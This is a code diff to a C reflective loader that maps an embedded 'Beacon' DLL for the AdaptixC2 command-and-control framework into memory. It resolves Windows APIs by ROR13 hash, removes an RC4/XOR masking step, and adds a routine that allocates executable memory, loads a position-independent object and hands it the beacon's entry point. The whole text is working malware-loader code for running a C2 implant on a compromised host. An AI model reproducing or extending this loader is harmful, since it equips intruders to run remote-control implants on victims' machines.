@@ -1,12 +1,10 @@
 #include <windows.h>
 #include "tcg.h"
-#include "mask.h"
 #include "util.h"
 #include "loader.h"
 
 /*
  * Removes RWX from DLL sections after loading, and applies the appropriate permissions based on the section characteristics
- * Masks DLL with RC4 or XOR
  */
 
 /*
@@ -20,25 +18,34 @@ FARPROC resolve(DWORD modHash, DWORD funcHash) {
 	return findFunctionByHash(hModule, funcHash);
 }
 
-/*
- * Crystal Palace convention for getting ahold of data linked with this loader.
- */
-char _DLL_[0] __attribute__((section("dll")));
-char _MASK_[0] __attribute__((section("mask")));
+char * getLoaderStartAddress() {
+    return (char *)go;
+}
+
+void JumpToFreePICO(IMPORTFUNCS * funcs, char * dllEntry, char *dllBase) {
+    char        * dstCode;
+    char        * dstData;
+    char        * src = GETRESOURCE(_PICO_);
+ 
+    /* Allocate memory for PICO */
+    dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
+    dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
+ 
+    /* load Pico into destination address */
+    PicoLoad(funcs, src, dstCode, dstData);
+ 
+    /* Execute PICO */
+    ((PICOMAIN_FUNC_3)PicoEntryPoint(src, dstCode)) (getLoaderStartAddress(), dllEntry, dllBase);
+}
 
 void go() {
 	char * dst;
 	char * src;
-    char * key;
 	DLLDATA dll;
 	IMPORTFUNCS funcs;
 
-	/* find rc4 encrypted or xor encoded Beacon DLL appended to this PIC along with the key*/
+	/* fetch Beacon DLL from section */
 	src = GETRESOURCE(_DLL_);
-    key = GETRESOURCE(_MASK_);
-
-	/* Unmask Beacon DLL */
-	src = unmask_rc4((RESOURCE *)src, (RESOURCE *)key);
 
 	/* parse Beacon DLL! */
 	ParseDLL(src, &dll);
@@ -59,12 +66,6 @@ void go() {
 	/* fix section permissions */
 	fix_section_permissions(&dll, src, dst);
 
-	/* Call the exported AdaptixC2 "GetVersions" function which will trigger the beacon */
-	_GetVersions pGetVersions = (_GetVersions)findFunctionByHash((HANDLE)dst, ror13hash("GetVersions"));
-	if (pGetVersions != NULL) {
-		pGetVersions();
-	}
-
-	/* Free the unmasked DLL */
-	KERNEL32$VirtualFree(src, 0, MEM_RELEASE);
+	/* Redirect execution to the FreePICO loader */
+	JumpToFreePICO(&funcs, (char *)findFunctionByHash((HANDLE)dst, ror13hash("GetVersions")), dst);
 }
